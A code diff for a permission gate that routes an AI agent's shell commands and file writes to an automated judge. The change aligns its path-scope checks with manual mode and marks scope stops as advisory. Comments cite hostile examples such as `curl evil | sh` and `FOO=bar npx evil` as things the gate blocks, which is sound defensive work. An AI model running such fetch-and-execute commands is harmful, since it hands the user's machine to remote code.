@@ -12,9 +12,16 @@
  *  - bash: parseable, no obscured command position (variable indirection —
  *    NOT flagged by halter's own analysis, checked here explicitly), no
  *    credential-pattern paths, no network egress, no paths outside the
- *    session base — INCLUDING paths whose location is statically unprovable
- *    (unbound variable, unresolvable cd target): Q1 is absolute, scope
- *    grants are the user's call, never the judge's. First-word checks are
+ *    MANUAL bar (cwd + session grants + config-allowed + trusted scripts —
+ *    exactly what manual mode auto-allows, getOutsideCwdPaths) — INCLUDING
+ *    paths whose location is statically unprovable (unbound variable,
+ *    unresolvable cd target): Q1 is absolute, scope grants are the user's
+ *    call, never the judge's. A path manual mode auto-allows (e.g. /tmp via
+ *    config) is not a scope violation — the judge reviews it (D11, 2026-08-26
+ *    re-alignment). Stops the judge should weigh (outside base, unresolvable
+ *    location, untrusted package) are marked advisory: the fall-through
+ *    prompt still renders the judge's verdict as input to the user's
+ *    allow/deny/grant decision. First-word checks are
  *    wrapper/env-prefix transparent (`FOO=bar npx evil` is npx evil; `env
  *    $f` is obscured) — the policy's delegation transparency, mirrored.
  *    Unsafe patterns (inline scripts, redirects, pipes, subshells) and risk
@@ -33,10 +40,11 @@
  *    -r/-R the target (if it exists) must be a directory or self-written.
  *    Non-rm danger reasons still block the carve-out (rm's neighborhood is
  *    bounded by design). The judge still approves.
- *  - file: ungranted writes inside the session base, no credential-pattern
- *    warning. A write into a session-granted dir is JUDGEABLE (D3) — the dir
- *    is user-trusted, the content is judged; ungranted outside-cwd writes
- *    stay on the floor (Q1: outside base). Reads are never judged.
+ *  - file: no credential-pattern warning. A write the manual mode
+ *    auto-allows (session-granted dir/file, config-allowed, project-pi) is
+ *    JUDGEABLE (D3, extended by D11) — the location is user-trusted, the
+ *    content is judged in full; truly outside-base writes stop (Q1: scope is
+ *    the user's call). Reads are never judged.
  *  - mcp: never auto-allowed — the gate has no model of server behavior, so
  *    the judge's word alone is not enough for automatic execution.
  */
@@ -47,7 +55,8 @@ import type { Store } from "./store";
 import { analyzeCommand } from "./analysis/command-analysis";
 import { resolveOpaqueRefs } from "./analysis/var-resolution";
 import { expandTilde } from "./analysis/path-util";
-import { resolvePathReal } from "./analysis/path-analysis";
+import { resolvePathReal, isInsideCwd, isAllowedReadPath, isAllowedWritePath, isProjectPiPathResolved } from "./analysis/path-analysis";
+import { isTrustedScriptPath } from "./config/trusted-scripts";
 import { UNKNOWN_CWD_MARKER, cdBaseBounds, OUT_REDIRECT_RE, IN_REDIRECT_RE, BARE_REDIRECT_RE } from "./analysis/cwd-tracking";
 import { rootScanTarget } from "./analysis/evaluators/disk-evaluator";
 import { OPAQUE_VAR_DIR } from "./analysis/bash-parser";
@@ -67,6 +76,12 @@ export type DspaGateResult =
       reason: string;
       /** D10: bare package names that stopped the command (prompt offers Trust). */
       untrustedPackages?: string[];
+      /** D11: the judge still runs both stages — its verdict renders in the
+       *  fall-through prompt as advisory input (the stop stands). Set for
+       *  scope-class stops (outside base, unresolvable location) and
+       *  untrusted packages; not for danger-class stops (a verdict on
+       *  `curl evil | sh` is noise). */
+      advisory?: boolean;
     };
 
 /**
@@ -226,12 +241,24 @@ export async function checkDspaGate(
     // judgeable — the user trusted the dir, so the outside-base stop does
     // not apply; the two-stage judge decides on the content. Ungranted
     // outside-cwd writes stay on the floor (Q1). Reads are never judged.
-    const grantedDirWrite = pd.isWriteOp && store.isInsideAllowedDir(pd.resolved, "write");
+    // D11: the floor's bar is the MANUAL write bar — a write manual mode
+    // auto-allows (session-granted dir or file, config-allowed, project-pi)
+    // is judgeable: the location is already user-trusted, the content is
+    // judged in full (the D3 probe converts that auto-allow to this prompt).
+    // Only truly outside-base writes stop (Q1: scope is the user's call).
+    const insideManualWriteBar =
+      pd.isWriteOp &&
+      (store.isInsideAllowedDir(pd.resolved, "write") ||
+        store.hasAllowedWritePath(pd.resolved) ||
+        isAllowedWritePath(pd.resolved) ||
+        isProjectPiPathResolved(pd.resolved, pd.cwd));
     // Name the violated base (the session cwd), not outsideDir — the
     // target's own parent (the grant-offer unit): `outside base (/a/b/config)`
     // read as though the file were outside its parent dir. The grant dir
     // stays visible in the same log line (promptDir/target).
-    if (!grantedDirWrite && pd.outsideDir) return { ok: false, reason: `outside base (session ${pd.cwd})` };
+    if (!insideManualWriteBar && pd.outsideDir) {
+      return { ok: false, reason: `outside base (session ${pd.cwd})`, advisory: true };
+    }
     if (pd.warnedRule) return { ok: false, reason: `credential pattern (${pd.warnedRule})` };
     return { ok: true };
   }
@@ -245,14 +272,24 @@ export async function checkDspaGate(
     }));
   if (analysis.hasParseError) return { ok: false, reason: "unparseable command" };
 
-  const isInsideBase = (p: string) =>
-    p === pd.cwd || p.startsWith(pd.cwd + "/") || store.isInsideAllowedDir(p, "write");
+  // D11 (2026-08-26 re-alignment): the floor's bar is the MANUAL bar — the
+  // same predicate the analysis uses for prompt.outsidePaths
+  // (getOutsideCwdPaths): cwd + session grants (read checks both sets) +
+  // config-allowed paths + trusted scripts. A location manual mode
+  // auto-allows is not a scope violation — the judge reviews it; only what
+  // manual would prompt for (outside base) stops here (Q1, re-confirmed).
+  const isInsideManualBar = (p: string) =>
+    isInsideCwd(p, pd.cwd) ||
+    store.isInsideAllowedDir(p, "read") ||
+    isAllowedReadPath(p) ||
+    isAllowedWritePath(p) ||
+    isTrustedScriptPath(p);
 
   let outsideExempt = new Set<string>();
   const hasRm = analysis.segments.some(isRmSegment);
   if (hasRm) {
     // rm carve-out: bounded, explicit targets only (see header).
-    const rm = checkRmTargets(analysis.segments, pd.cwd, isInsideBase);
+    const rm = checkRmTargets(analysis.segments, pd.cwd, isInsideManualBar);
     if (rm.reason) return { ok: false, reason: rm.reason };
     outsideExempt = rm.exempt;
     // Non-rm dangerous reasons still block: the carve-out covers only the
@@ -294,6 +331,7 @@ export async function checkDspaGate(
       ok: false,
       reason: `untrusted package (${uniq.slice(0, 3).join(", ")})`,
       untrustedPackages: uniq.map((s) => s.split(/\s+/)[1]),
+      advisory: true,
     };
   }
   // Full-filesystem scan (find /, grep -rn /): a dedicated stop reason —
@@ -305,15 +343,14 @@ export async function checkDspaGate(
   }
   const net = networkHit(pd.command, analysis.segments);
   if (net) return { ok: false, reason: `network egress (${net})` };
-  // Re-filter the FULL path set under the floor's bar, not the manual bar:
-  // prompt.outsidePaths drops config-allowed paths (/tmp, ~/.pi, trusted
-  // skill scripts) and read-only session grants — but the floor is session-
-  // base only (D7), so a config-allowed concrete write (`cat > /tmp/x`) must
-  // stop here exactly like its opaque-resolved counterpart. Sentinels pass
-  // through unchanged and keep the D7 resolution below.
-  const outside = analysis.paths
-    .filter((p) => !isInsideBase(p))
-    .filter((p) => !outsideExempt.has(p));
+  // prompt.outsidePaths already applied the manual bar (above): what's left
+  // is exactly what manual mode would prompt for — the scope class (Q1:
+  // the user's call, judgeable only after an Always-for-dir grant). The D7
+  // 5ef1f0f session-base re-filter is reverted by D11: config-allowed
+  // concrete paths (`cat > /tmp/x`) are judgeable, matching their
+  // opaque-resolved counterparts under the same bar. Sentinels pass through
+  // unchanged and keep the D7 resolution below.
+  const outside = (analysis.prompt.outsidePaths ?? []).filter((p) => !outsideExempt.has(p));
   // D7: resolve the sentinels (see d7ResolveSentinel). Concrete outside
   // locations stop (naming the dir for a one-time grant); unprovable
   // locations stop outright (Q1 — never judgeable).
@@ -324,29 +361,26 @@ export async function checkDspaGate(
       resolvedOutside.push(p);
       continue;
     }
-    const r = d7ResolveSentinel(p, pd.cwd, isInsideBase, bounds);
+    const r = d7ResolveSentinel(p, pd.cwd, isInsideManualBar, bounds);
     if (r.kind === "outside") resolvedOutside.push(...r.paths);
-    else if (r.kind === "stop") return { ok: false, reason: r.reason };
+    else if (r.kind === "stop") return { ok: false, reason: r.reason, advisory: true };
     // inside → drop
   }
-  // The analysis layer resolved paths and opaque refs under the MANUAL bar
-  // (cwd + config-allowed + granted). The dspa floor is stricter (session
-  // base only): the concrete set is re-filtered above, and the raw opaque
-  // data is re-resolved here, so a value the manual bar would allow (e.g.
-  // /tmp via config) still stops here (D7) — concrete paths and opaque
-  // refs alike.
+  // Opaque refs re-resolved under the floor's (manual) bar — defensive twin
+  // of the analysis-layer resolution above: a value the bar allows (e.g.
+  // /tmp via config) is dropped, a concrete outside path stops (D7).
   const floor = resolveOpaqueRefs(
     analysis.opaque,
     analysis.parsedSegments,
     analysis.effectiveCwds,
     analysis.assignments,
     pd.cwd,
-    isInsideBase,
+    isInsideManualBar,
   );
   resolvedOutside.push(...floor.paths);
   if (resolvedOutside.length > 0) {
     const shown = [...new Set(resolvedOutside)].slice(0, 2);
-    return { ok: false, reason: `touches paths outside base (${shown.join(", ")})` };
+    return { ok: false, reason: `touches paths outside base (${shown.join(", ")})`, advisory: true };
   }
   return { ok: true };
 }
@@ -469,7 +503,7 @@ function checkRmTargets(
           !written.has(resolved) &&
           !isTmpScratchTarget(resolved, recursive)
         ) {
-          return { reason: `rm target outside session base (${a.slice(0, 60)})`, exempt: new Set() };
+          return { reason: `rm target outside base (${a.slice(0, 60)})`, exempt: new Set() };
         }
       }
     } else {
@@ -513,10 +547,8 @@ function checkRmTargets(
     }
   }
 
-  // Every surviving rm target is judgeable per the carve-out (inside base,
-  // self-written, or non-recursive /tmp scratch) — exempt them ALL from the
-  // floor's outside-base re-filter. The old self-written-only set sufficed
-  // because the manual bar hid /tmp-scratch targets in config-allowed space;
-  // the floor re-filter sees them, and D8 requires they stay judgeable.
-  return { reason: null, exempt: new Set(rmTargets) };
+  // Self-written targets are exempt from the floor's outside-base stop —
+  // the create-then-delete set is judgeable (D8 /tmp-scratch targets are
+  // inside the manual bar via config and never reach the outside set).
+  return { reason: null, exempt: new Set([...rmTargets].filter((t) => written.has(t))) };
 }
